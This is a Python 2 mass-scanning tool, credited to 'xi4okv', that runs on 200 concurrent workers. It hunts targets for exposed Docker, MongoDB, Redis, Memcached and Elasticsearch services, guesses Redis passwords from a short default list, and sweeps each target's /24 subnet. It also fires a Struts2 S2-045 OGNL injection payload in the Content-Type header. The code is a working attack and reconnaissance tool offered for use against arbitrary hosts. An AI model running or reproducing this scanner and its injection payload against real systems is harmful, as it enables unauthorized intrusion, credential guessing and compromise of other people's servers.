#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import gevent
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
from gevent.queue import PriorityQueue
import requests
import time
import sys
from lib.console_width import getTerminalSize
import socket
import binascii

class Scanner:
    def __init__(self):
        self.start_time = time.time()
        self.queue = PriorityQueue()
        self.history = []
        self.total_count = 0
        self.scan_count = 0
        self._load_target()
        self.outfile = open("log.log", 'w')
        self.console_width = getTerminalSize()[0] - 2

    def _print_msg(self, _msg=None, _found_msg=False):
        if _msg is None:
            msg = '%s TotalCount| %s Scanned in %.2f seconds' % (
                    self.total_count,self.total_count - self.queue.qsize(), time.time() - self.start_time)
            sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
        else:
            sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)) + '\n')
            self.outfile.write(_msg + '\n')
            self.outfile.flush()
            if _found_msg:
                msg = '%s TotalCount| %s Scanned in %.2f seconds' % (
                        self.total_count,self.total_count - self.queue.qsize(), time.time() - self.start_time)
                sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
        sys.stdout.flush()

    def _load_target(self):
        print '[+] Read targets ...'
        target_file = raw_input("Target File :")
        with open(target_file) as f:
            for line in f.xreadlines():
                target = line.strip()
                self.queue.put(target)

        print "TotalCount is %d" % self.queue.qsize()
        self.total_count = self.queue.qsize()
        print "Now scanning ..."

    def _scan(self,case):
        while not self.queue.empty():
            target = self.queue.get()
            if case == "1":
                self.vulnCheck(target)
            if case == "2":
                self.s2_045(target)
            if case == "3":
                self.headers(target)
            if case == "4":
                self.weakfile(target)
            if case == "5":
                self.portscan_c(target)



#####################################################################
#                                                                   #
#    Vuln poc by:xi4okv QQ:48011203                                 #
#                                                                   #
#####################################################################

    def vulnCheck(self,target):
        if ":2375" in target:
            try:
                res = requests.head("http://" + str(target) + "/containers/json",timeout=2)
                if res.headers['Content-Type'] == 'application/json':
                    self._print_msg(target + "==>  docker api Vuln",True)
                else:
                    self._print_msg()
            except:
                self._print_msg()
            self._print_msg()

        if ":27017" in target:
            ip,port = target.split(":")
            try:
                socket.setdefaulttimeout(3)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                data = binascii.a2b_hex("3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
                s.send(data)
                result = s.recv(1024)
                if "ismaster" in result:
                    getlog_data = binascii.a2b_hex("480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
                    s.send(getlog_data)
                    result = s.recv(1024)
                    if "totalLinesWritten" in result:
                        self._print_msg(target + "==>  mongodb Vuln",True)
            except Exception, e:
                pass

        if ":6379" in target:
            ip,port = target.split(":")
            try:
                socket.setdefaulttimeout(3)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("INFO\r\n")
                result = s.recv(1024)
                if "redis_version" in result:
                    self._print_msg(target + "==>  redis Vuln",True)
                elif "Authentication" in result:
                    for pass_ in ['123456','redis','pass','password']:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip, int(port)))
                        s.send("AUTH %s\r\n" % (pass_))
                        result = s.recv(1024)
                        if '+OK' in result:
                           self._print_msg(target + "==>  redis pass Vuln :" + pass_,True)
            except Exception, e:
                pass
        if ":11211" in target:
            ip,port = target.split(":")
            try:
                socket.setdefaulttimeout(3)
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, int(port)))
                s.send("stats\r\n")
                result = s.recv(1024)
                if "STAT version" in result:
                    self._print_msg(target + "==>  memcache Vuln",True)
            except Exception, e:
                pass

        if ":9200" in target:
            try:
                res = requests.head("http://" + str(target) + "/_rvier/_search",timeout=2)
                if res.status_code == 200:
                    self._print_msg(target + "==>  Elasticsearch Vuln",True)
                else:
                    self._print_msg()
            except:
                self._print_msg()
            self._print_msg()


    def headers(self,target):
        try:
            res = requests.head("http://" + str(target),timeout=1)
            self._print_msg(target + "==>" + str(res.headers),True)
        except:
            self._print_msg()
        self._print_msg()

    def s2_045(self,target):
        try:
            data = {"image": " "}
            headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
               "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vul','s2-045')}.multtargetart/form-data"}
            req = requests.post("http://" + str(target), data=data, headers=headers)
            if req.headers["vul"] == "s2-045":
                self._print_msg(target + "==>" + "S2-045 Vuln",True)
        except:
            self._print_msg()
        self._print_msg()

    def weakfile(self,target):
        weaklist = ["robots.txt", "/i.php", "/phpinfo.php"]
        for weakfile in weaklist:
            try:
                res = requests.head("http://" + str(target) + weakfile,timeout=1)
                if res.status_code == 200:
                    if ("User-agent" in res.content) or ("phpinfo" in res.content):
                        self._print_msg("http://" + target + weakfile ,True)
            except:
                self._print_msg()
        self._print_msg()


    def portscan_c(self,target):
        import socket
        ip = socket.gethostbyname(target)
        ports = [2375,2376,2377,6379,9200,11211,27017]
        ip = ip.split(".")
        ipc = ip[0]+"."+ip[1]+"."+ip[2]+"."
        if ipc in self.history:
            return
        else:
            self.history.append(ipc)

        for port in ports:
            for i in range(255):
                try:
                    cs = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    cs.settimeout(float(0.5))
                    address=(ipc+str(i), int(port))
                    status = cs.connect_ex((address))
                    if status == 0:
                        self._print_msg( ipc+str(i) + ":" + str(port) ,True)
                except Exception ,e:
                    pass
                    #print "error:%s" %e
                finally:
                    cs.close()
            self._print_msg()



#####################################################################
#                                                                   #
#    Vuln runner by:xi4okv QQ:48011203                              #
#                                                                   #
#####################################################################


    def run(self,case):
        threads = [gevent.spawn(self._scan,case) for i in xrange(200)]
        try:
            gevent.joinall(threads)
        except KeyboardInterrupt, e:
            msg = '[WARNING] User aborted.'
            sys.stdout.write('\r' + msg + ' ' * (self.console_width - len(msg)) + '\n\r')
            sys.stdout.flush()



if __name__ == '__main__':
    d = Scanner()
    print "1.vuln check"
    print "2.s2-045"
    print "3.headers"
    print "4.weakfile"
    print "5.portscan_c"
    case = raw_input("Please input case:")
    d.run(case)
    print "\nEnd!"
    d.outfile.flush()
    d.outfile.close()